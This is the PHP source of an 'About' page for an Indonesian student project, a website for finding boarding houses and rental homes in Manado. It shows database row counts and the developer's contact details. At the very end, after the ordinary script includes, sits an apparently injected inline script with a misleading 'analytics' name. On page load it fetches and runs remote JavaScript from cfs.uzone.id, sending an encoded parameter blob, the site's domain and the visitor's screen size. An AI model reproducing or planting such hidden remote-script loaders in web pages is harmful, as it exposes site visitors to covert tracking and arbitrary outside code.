<?php
include "config.php";

$kos = "SELECT * FROM item WHERE jenis =11 ";
$resultkos = mysqli_query($link, $kos);
$jumlahkos =  mysqli_num_rows($resultkos);

$kontrakan = "SELECT * FROM item WHERE jenis =12 ";
$resultkontrakan = mysqli_query($link, $kontrakan);
$jumlahkontrakan =  mysqli_num_rows($resultkontrakan);

$pengguna = "SELECT * FROM users ";
$resultpengguna = mysqli_query($link, $pengguna);
$jumlahpengguna =  mysqli_num_rows($resultpengguna);

$pesanan = "SELECT * FROM pesanan ";
$resultpesanan = mysqli_query($link, $pesanan);
$jumlahpesanan =  mysqli_num_rows($resultpesanan);





?>
<!doctype html>
<html class="no-js" lang="en">
    

<head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>Sistem Informasi Pencarian Tempat Kos dan Rumah Kontrakan di Manado</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="assets/img/home.ico">
		
		<!-- all css here -->
		<link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css" type="text/css">
        <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/font-awesome.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/pe-icon-7-stroke.css" type="text/css">	
        <link rel="stylesheet" href="assets/css/animate.css" type="text/css">
		<link rel="stylesheet" href="assets/css/animate-headline.css" type="text/css">
        <link rel="stylesheet" href="assets/css/jquery-ui.css" type="text/css">
        <link rel="stylesheet" href="assets/css/meanmenu.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/bundle.css" type="text/css">
        <link rel="stylesheet" href="assets/css/style.css" type="text/css">
        <link rel="stylesheet" href="assets/css/responsive.css" type="text/css">
		<link rel="stylesheet" href="assets/css/map.css" type="text/css">	
		<link rel="stylesheet" href="lib/css/nivo-slider.css" type="text/css">
		<link rel="stylesheet" href="lib/css/preview.css" type="text/css" media="screen">
    </head>
    <body>
        <!-- header start -->
		
		<!-- header end -->
		<!-- mobile-menu-area start -->
       
        <!-- mobile-menu-area end -->
		<!-- breadcrumbs start -->
		<div class="breadcrumbs-area breadcrumb-bg ptb-100">
		    <div class="container">
		        <div class="breadcrumbs text-center">
                    <h2 class="breadcrumb-title">About</h2>
                    
                </div>
		    </div>
		</div>
		<!-- breadcrumbs area end -->
		<!-- login area end -->
<div class="about-area ptb-100">
		    <div class="container">
		        <div class="row">
		            <div class="col-md-12">
		                <div class="about-all">
		                    <h2>Selamat Datang di Website Sistem Informasi Pencarian Tempat Kos dan Rumah Kontrakan di Manado</h2>
		                    <p>Website ini bertujuan untuk para pencari maupun penyedia tempat layanan kos atau kontrakan untuk dapat mempermudah mereka memenuhi kebutuhan masing-masing pengguna. Pengunjung dapat menggunakan layanan yang ada pada website ini guna untuk mencari maupun menyediakan tempat kos atau kontrakan. Website ini didesain dengan dinamis agar pengunjung dapat dengan mudah menggunakannya.</p>
		                    <p>Website ini dibuat demi menunjang kebutuhan pembuat untuk menyelesaikan tugas akhir yang ada di Universitas Sam Ratulangi Fakultas Teknik Prodi Informatika. Dimana website ini merupakan pengembangan dari website sebelumnya dalam lingkup sekitaran kampus Universitas Sam Ratulangi diperluas menjadi kos dan kontrakan yang ada di Manado.</p>
							<p>Untuk info selanjutnya, silahkan hubungi developer dibawah ini.</p>
							<p><div class="widget-info">
                                    <p>
                                        <i class="pe-7s-user"> </i>
                                        <span>
                                            Angga Qurnen Suwito
                                        </span>
                                    </p>
                                    <p>
                                        <i class="pe-7s-mail"></i>
                                        <span>
                                            angga.q.suwito@gmail.com
                                        </span>
                                    </p>
                                    <p>
                                        <i class="pe-7s-call"></i>
                                        <span>+62 853 9992 1552 </span>
                                    </p>
                                </div></p>
							
		                </div>
		            </div>
		            
		        </div>
		    </div>
		</div>
        <div class="counter-area gray-bg pt-100 pb-70">
            <div class="container">
                <div class="row">
                    <div class="col-md-3 col-sm-3">
                        <div class="single-counter text-center mb-30">
                            <h3 class="shop-counter"><?php echo $jumlahpengguna; ?></h3>
                            <p>Pengguna</p>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-3">
                        <div class="single-counter text-center mb-30">
                            <h3 class="shop-counter"><?php echo $jumlahkos; ?></h3>
                            <p>Kos</p>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-3">
                        <div class="single-counter text-center mb-30">
                            <h3 class="shop-counter"><?php echo $jumlahkontrakan; ?></h3>
                            <p>Kontrakan</p>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-3">
                        <div class="single-counter text-center mb-30">
                            <h3 class="shop-counter"><?php echo $jumlahpesanan; ?></h3>
                            <p>Pesanan</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- service area start  -->
		
		<!-- login area end -->
		<!-- subscribe area start -->
		
		<!-- subscribe area end -->
		<!-- footer area start -->
		<footer class="footer-area">
		    <div class="container">
                <div class="footer-top pt-60 pb-30">
                  
					
                </div>
                <div class="footer-bottom ptb-20">
                    <div class="row">
					
                        <div class="col-md-7 col-sm-7">
                            <div class="copyright">
                                <p>
                                    Copyright © 2018 Angga Qurnen Suwito
                                    
                                </p>
                            </div>
                        </div>
						<div class="col-md-3 col-sm-3">
                            <div class="footer-widget mb-30">
                                <div class="footer-title">
                                    <h3>Layanan</h3>
                                </div>
                                <div class="widget-text">
                                    <ul>
                                        <li><a href="about.php" target="_blank" rel="noopener noreferrer">About</a></li>
                                        <li><a href="tutorialpencari.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Pencari</a></li>
                                        <li><a href="tutorialpenyedia.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Penyedia</a></li>
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-2 col-sm-2">
                            
							<div class="payment f-right">
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                        <li><a href="#"><i class="fa fa-pinterest-p"></i></a></li>
                                    </ul>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</footer>
		<!-- footer area end -->	
		
		<!-- all js here -->
        <script src="assets/js/vendor/jquery-1.12.0.min.js" type="text/javascript"></script>
		<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.meanmenu.js" type="text/javascript"></script>
        <script src="assets/js/jquery.magnific-popup.min.js" type="text/javascript"></script>
        <script src="assets/js/isotope.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/imagesloaded.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.validate.min.js" type="text/javascript"></script>
        <script src="assets/js/owl.carousel.min.js" type="text/javascript"></script>
		<script src="lib/js/jquery.nivo.slider.js" type="text/javascript"></script>
		<script src="lib/home.js" type="text/javascript"></script>
		<script src="assets/js/plugins.js" type="text/javascript"></script>
        <script src="assets/js/main.js" type="text/javascript"></script>
		<script src="assets/js/vendor/modernizr-2.8.3.min.js" type="text/javascript"></script>
	
		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31jJGKDJMFRytkSj9I4j9ndv8I42R%2fLMgHcocdiupOeMvQ52aQnn9OdsvvFjomKd2I9VTDZPL8wYhAtzzdKiVMsr8r2CBKby5zcW6CWpYJFPKYTrwnwCYSCNT9Mi%2fQxdABzKXqsYHhuxfQ7tA4ku%2bC51m4A11K09oK8UuhW6or%2f%2fyFugzstUe3s2FXCQwUWEz11FnuMbiZSgPlDHUuLVxZKfUYGgnNW8rnicr1GHF1r8VTs6x%2bNkvGCUY8cp9oK62u0ZLukFHGY8OhMvfuf16c6ezhncjYkp5BReomV7fi2y%2fiNBapIXTjE5b%2fOdtYYqvguxNl4t7girhoc1K0Q9z%2bjLW6dcTESuvd%2fRkNs12BcwW1HTIf1D8vNbowZi5eO7IssLtpRGEQgtAl1CKLTmOfecmW3FPWs8SADIzjNNv9ztYWD5wLhD%2fd55gSiDpw9fwyApKwhzqTJalLiZJrdZD9pDHNM7xoEgfTPpJru%2bD6yTyMssyDRFpbAibzMxklSPYG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
